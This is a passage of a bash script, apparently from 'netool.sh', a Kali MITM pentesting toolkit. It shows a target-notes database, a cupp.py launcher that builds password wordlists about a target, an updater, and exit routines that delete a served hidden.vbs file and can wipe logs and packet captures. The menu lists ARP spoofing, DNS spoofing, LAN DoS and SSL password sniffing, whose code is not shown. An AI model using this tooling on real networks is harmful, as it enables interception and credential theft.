       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$mad" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Database clean with\nnew Append" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       sh_2menu


else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   sh_2menu
fi
}








# -----------------------------------
# start cupp.py (common user password profiler)
# -----------------------------------
sh_profiler () {
Colors;

   # check if cupp.py installation exists
   if [ -e $H0m3/opensource/modules/cupp.py ]; then
   echo ${BlueF}[*]${RedF}:${BlueF}[cupp.py]${RedF}:${GreenF}[ installation found ]${Reset};
   sleep 1

   QuE=$(zenity --question --title "CUPP.PY - password profiler" --text "cupp.py builds a dicionary file based\non target profile by asking to attacker to input key words about the target." --width 350) > /dev/null 2>&1
   if [ "$?" -eq "0" ]; then

      # start cupp.py script
      cd ~/opensource/modules
      cp cupp.py $H0m3/opensource/files
      cd $H0m3/opensource/files
      ./cupp.py
      rm cupp.py > /dev/null 2>&1
      chown $usera *.txt
      echo ${YellowF}[+]${RedF}:${YellowF}press ${GreenF}[Enter]${YellowF} to Return to main menu ${Reset};
      read op
      cd $H0m3/opensource

   else
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   clear
   sh_MAIN
   fi


else

   echo ${RedF}[x]:[warning]:${YellowF}[ this module required cupp.py instaled to work ]${Reset};
   sleep 4
   exit
fi
}








# ----------------------------------
# update netool.sh toolkit using GIT and CAT
# ----------------------------------
sh_update () {
Colors;

   mkdir $tWd > /dev/null 2>&1
   cd $tWd
   # download update.txt from GIT
   # wget -qq https://dl.dropboxusercontent.com/u/21426454/netool-kali/update.txt
   wget -qq https://dl.dropboxusercontent.com/u/21426454/netool-kali/update2.txt

      uppath=`echo ~`
      # var to compare git version vs local version
      GIT=`cat $tWd/update2.txt | egrep -m 1 "V3rs10n:" | cut -d ':' -f2` > /dev/null 2>&1
      LOCAL=`cat $H0m3/opensource/modules/update.txt` > /dev/null 2>&1
      INF=`cat $tWd/update2.txt | egrep -m 1 "1nf0" | cut -d ':' -f2` > /dev/null 2>&1
      S1ze=`cat $tWd/update2.txt | egrep -m 1 "S1z3" | cut -d ':' -f2` > /dev/null 2>&1
      codename=`cat $tWd/update2.txt | grep "C0den4me" | cut -d ':' -f2` > /dev/null 2>&1

         # check the 2 files for version display using CAT command
         if [ "$GIT" ">" "$LOCAL" ];then
         echo ${BlueF}[*]${RedF}:${BlueF}[Updating]:${GreenF}Updates Available...${Reset};
         sleep 2
         echo ${BlueF}'  _'${Reset};
         echo ${BlueF}' |' ${GreenF}version available ${BlueF}:${GreenF} $GIT ${Reset};
         echo ${BlueF}' |' ${white}update information${BlueF}:${white} $INF version${Reset};
         echo ${BlueF}' |' ${white}toolkit codename ${BlueF}:${white} $codename ${Reset};
         echo ${BlueF}' |' ${white}temp download dir ${BlueF}:${white} $tWd ${Reset};
         echo ${BlueF}' |_'${white}tar download size ${BlueF}:${white} $S1ze ${Reset};
         echo ${BlueF}' |' ${YellowF}version installed ${BlueF}:${RedF} $LOCAL ${Reset};
         echo ${BlueF}' |' ${white}tool distribution ${BlueF}:${white} $distr ${Reset};
         echo ${BlueF}' |_'${white}full install path ${BlueF}:${white} $loca ${Reset};
         echo ""

      # chose to run  or to leave to main menu
      read -p "[+]:Update [$uppath/opensource] path?(yes|no):" pass
      if test "$pass" = "yes"

      then

        echo ${BlueF}[*]${RedF}:${BlueF}[Updating]:${white}Toolkit Version From: ${BlueF}[${GreenF} $LOCAL ${BlueF}]${white} To ${BlueF}[${GreenF} $GIT ${BlueF}] ${Reset};
        sleep 3
        echo ${BlueF}[*]${RedF}:${BlueF}[Updating]:${white}Downloading from GIT repository! ${Reset};
        xterm -T "Downloading $GIT version" -e "git clone git://git.code.sf.net/p/netoolsh/opensource--kali opensource"
        echo ${BlueF}[*]${RedF}:${BlueF}[Updating]:${white}Opensource 'install' path:$loca ${Reset};
        echo ${BlueF}[*]${RedF}:${BlueF}[Updating]:${white}Remove old config files! ${Reset};

        # removing old config files
        cp -u -r -f $tWd/opensource $uppath
        rm -f -r $tWd
        echo ${BlueF}[*]${RedF}:${BlueF}[Updating]:${white}Restart Toolkit: ${BlueF}[${GreenF} OK ${BlueF}] ${Reset};
        chown -R $usera $uppath/opensource
        sleep 5
        exit

      else

        echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
        sleep 2
        rm -f -r $tWd
        cd ~/opensource
        sh_MAIN
        clear
      fi



else


echo ${BlueF}[*]${RedF}:${BlueF}[Updating]:${RedF}No Updates Available... ${Reset};
sleep 2
echo ${BlueF}'  _'${Reset};
echo ${BlueF}' |'  ${white}version available ${BlueF}:${RedF} $GIT ${Reset};
echo ${BlueF}' |_'${white}version installed ${BlueF}:${GreenF} $LOCAL ${Reset};
echo ""
echo ${BlueF}[*]${RedF}:${BlueF}Press [${GreenF}Enter${BlueF}] to return to main menu ${Reset};
read op
# remove old config files
rm -f -r $tWd
cd ~/opensource
sh_MAIN # return to main menu
fi
}





# ----------------------------------
# TOOLKIT DATABASE.db DISPLAY
# ----------------------------------
sh_database () {
Colors;

   # check if database file exists
   if [ -e ~/opensource/modules/database.db ]; then
     sh_database2

else

 Colors;
 zenity --warning --title="T00LKIT DATABASE - NOT FOUND" --text "Please Check:\n/opensource/modules/database.db" --width 350 > /dev/null 2>&1
 clear
fi
}


sh_database2 () {
Colors;

   # store scans in database?
   dbt=$(zenity --list --title "T00LKIT DATABASE (database.db)" --text "Access t00lkit database?" --radiolist --column "Pick" --column "Option" TRUE "View database?" FALSE "Clear Database" FALSE "Append to DataBase" FALSE "Clear Database and manually input" --width 330 --height 270) > /dev/null 2>&1


     if [ "$dbt" = "View database?" ]; then
       sh_database3 # goto view database display


     elif [ "$dbt" = "Clear Database" ]; then
       echo "" > $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Database clean" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1


     elif [ "$dbt" = "Append to DataBase" ]; then
       dtr=`date`
       mad=$(zenity --title="APPEND TO DATABASE" --text "You can input TARGET-IP, NOTES" --entry --width 330) > /dev/null 2>&1
       echo "" >> $H0m3/opensource/modules/database.db
       echo "" >> $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$mad" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Appended to DataBase" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1


     elif [ "$dbt" = "Clear Database and manually input" ]; then
       dtr=`date`
       mad=$(zenity --title="CLEAN AND APPEND TO DATABASE" --text "You can input TARGET-IP, NOTES" --entry --width 330) > /dev/null 2>&1
       echo "" > $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$mad" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Database clean with\nnew Append" --width 300 > /dev/null 2>&1


else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
fi
}


sh_database3 () {
Colors;

     # Display current settings stored in database
     echo ${RedF}+-------------------------------+${Reset};
     echo ${RedF}'|'- T00LKIT DATABASE - NOTEBOOK -'|'${Reset};
     echo ${RedF}+-------------------------------+${Reset};
     # display results in green fonts
     echo ${GreenF}
     cat $H0m3/opensource/modules/database.db
     echo ${Reset};
     echo ${BlueF}[*]${RedF}:${YellowF}Press [${GreenF} ENTER ${YellowF}] to Exit database.${Reset};
     read op
     clear

}










###################################################################
#                          exit script                            #
###################################################################
sh_exit () {
   Colors;
   echo ${RedF}[x]:[ QUITTING T00LKIT ] ${Reset};
   sleep 2
clear
cat << !

    ┌┐┌┌─┐┌┬┐  ┌┬┐┌─┐┌─┐┬  ┌─┐
    │││├┤  │    │ │ ││ ││  └─┐
    ┘└┘└─┘ ┴    ┴ └─┘└─┘┴─┘└─┘$ver
!
echo ${RedF}peterubuntu10[at]sourceforge[dot]net ${Reset};
echo ${BlueF}[HOME]${RedF}:${YellowF}http://sourceforge.net/projects/netoolsh/${Reset};

   if [ -e /var/www/hidden.vbs ]; then
   rm /var/www/hidden.vbs
   sh_clean

else

   sh_clean
 fi
}

sh_clean () {
Colors;

    # variable declarations
    Cl3An=`cat ~/opensource/toolkit_config | egrep -m 1 "CLEAN_LOGS" | cut -d '=' -f2`
    # CHECK TOOLKIT_CONFIG SETTINGS
    if [ "$Cl3An" = "YES" ]; then
      cd $H0m3/opensource/logs
      rm -f *.log > /dev/null 2>&1
      rm -f *.pcap > /dev/null 2>&1
      sh_cl44

    else
      zenity --title="T00LKIT LOGFILES" --text "REMENBER:\nTO CHECK YOUR LOG FOLDER" --width 350 --info > /dev/null 2>&1
      sh_cl44
  fi
}



sh_cl44 () {
Colors;

    # variable declarations
    Cl3An=`cat ~/opensource/toolkit_config | egrep -m 1 "CLEAN_HANDLERS" | cut -d '=' -f2`
    # CHECK TOOLKIT_CONFIG SETTINGS
    if [ "$Cl3An" = "YES" ]; then
      cd $H0m3/opensource/priv8/handler > /dev/null 2>&1
      rm *.rc > /dev/null 2>&1
      zenity --info --title="CLEAN_HANDLERS_ON_EXIT" --text "ALL STORED HANDLERS DELETED" --width 350 > /dev/null 2>&1
      sh_cl33p

    else
      sh_cl33p
  fi
}


sh_cl33p () {
Colors;

    # variable declarations
    DaT4=`cat ~/opensource/toolkit_config | egrep -m 1 "CLEAN_DATABASE" | cut -d '=' -f2`
    # CHECK TOOLKIT_CONFIG SETTINGS
    if [ "$DaT4" = "YES" ]; then
      echo "" > $H0m3/opensource/modules/database.db
      zenity --info --title="CLEAN_DATABASE_ON_EXIT" --text "T00LKIT DATABASE SUCCESSFULLY CLEAN" --width 350 > /dev/null 2>&1
      exit

    else
      sleep 2
      exit
  fi
}








####################################################################
#                          menu principal                          #
####################################################################
sh_MAIN () {
clear
}

while : # Loop forever
do
cat << !

                        _     _              _
                       | |   | |            | |
             _ __   ___| |_  | |_ ___   ___ | |___
            | '_ \ / _ \ __| | __/ _ \ / _ \| / __/
            | | | |  __/ |_  | || (_) | (_) | \__ |
            |_| |_|\___|\__|  \__\___/ \___/|_|___/
 +-------------------------------------------------------------+
 |            MITM Pentesting OpenSource toolkit               |
 |            Distro:linux-Kali    Version:$ver                 |
 |                 codename: SINGLE_BYTE_XOR                   |
 +-------------------------------------------------------------+

    1  - Show Local Connections       [none]
    2  - Nmap scanner Menu            [Nmap]
    3  - Retrieve metadata            [wget]
    4  - Open router config           [browser]
    5  - Ip tracer whois              [browser]
    6  - INURLBR scanner [webcrawler] [inurlbr.php]
    7  - Wordlist creator [cupp.py]   [password profiler]
    8  - Rootsector exploits          [msf+apache+ettercap]

    9  - Config ettercap              [ettercap]
    10 - Launch MITM                  [ettercap]
    11 - Show URLs visited            [ettercap]
    12 - MITM + Dns-Spoofing          [ettercap]
    13 - DoS attack [local lan]       [ettercap]
    14 - Compile etter.filters        [ettercap]
    15 - Execute ettercap filter      [ettercap]
    16 - Share files [local lan]      [ettercap+apache]
    17 - Sniff target browser pics    [ettercap+driftnet]
    18 - Sniff SSL login passwords    [ettercap+sslstrip]
  _
 |  d - Delete lock folders
 |  a - Toolkit changelog
 |  u - Check for Updates
 |  c - Config toolkit
 | db - Access database
 |_ q - Quit

!
echo ${RedF}'_'${Reset};
echo -n "[>]:(Your choice?):"
read choice
case $choice in
1) sh_port ;;
2) sh_grab ;;
3) sh_retrieve ;;
4) sh_router ;;
5) sh_tracer ;;
6) sh_driscanner ;;
7) sh_profiler ;;
8) sh_priv8 ;;
9) sh_edc ;;
10) sh_arp ;;
11) sh_url ;;
12) sh_spoofing ;;
13) sh_dos ;;
14) sh_comp ;;
15) sh_lunch ;;
16) sh_shared ;;
17) sh_finger ;;
18) sh_sslstrip ;;
u) sh_update ;;
U) sh_update ;;
a) sh_ABOUT ;;
A) sh_ABOUT ;;
c) sh_toolconf ;;
C) sh_toolconf ;;
q) sh_exit ;;
db) sh_database ;;
*) echo "\"$choice\" is not a valid choise"; sleep 2; clear ;;
esac
done
